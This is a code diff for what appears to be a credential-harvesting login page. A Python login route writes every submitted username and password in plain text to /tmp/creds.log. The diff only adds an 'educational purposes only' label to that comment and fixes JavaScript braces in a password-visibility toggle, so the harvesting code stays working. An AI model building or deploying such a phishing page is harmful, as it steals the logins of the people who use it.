@@ -9,7 +9,7 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
         
-        # Save credentials to temporary storage
+        # Save credentials to temporary storage (⚠️ for educational purposes only)
         with open('/tmp/creds.log', 'a') as f:
             f.write(f"{username}:{password}\n")
         
@@ -155,16 +155,16 @@ def login():
       </div>
 
       <script>
-        document.getElementById('eye').addEventListener('click', function () {{
+        document.getElementById('eye').addEventListener('click', function () {
           const passwordInput = document.getElementById('password');
-          if (passwordInput.type === 'password') {{
+          if (passwordInput.type === 'password') {
             passwordInput.type = 'text';
             this.textContent = '🙈';
-          }} else {{
+          } else {
             passwordInput.type = 'password';
             this.textContent = '👁️';
-          }}
-        }});
+          }
+        });
       </script>
     </body>
     </html>
